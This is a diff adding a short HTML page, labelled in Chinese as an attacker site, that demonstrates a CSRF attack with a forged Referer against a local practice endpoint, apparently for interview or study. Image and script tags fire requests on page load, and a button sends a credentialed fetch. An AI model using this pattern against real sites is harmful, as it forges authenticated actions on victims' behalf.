@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>这是攻击伪造网站</title>
+	</head>
+	<body>
+		<h1>攻击者网站</h1>
+		<button onclick="fakeReferer()">伪造Referer发起CSRF攻击</button>
+		<img src="http://interview.local.cn/api/demo" alt="CSRF攻击测试" />
+		<script src="http://interview.local.cn/api/demo"></script>
+		<script>
+			function fakeReferer() {
+				fetch('http://interview.local.cn/api/demo', {
+					credentials: 'include',
+					referrer: 'http://interview.local.cn',
+					mode: 'no-cors',
+					referrerPolicy: 'origin-when-cross-origin',
+				}).then((res) => console.log(res));
+			}
+		</script>
+	</body>
+</html>
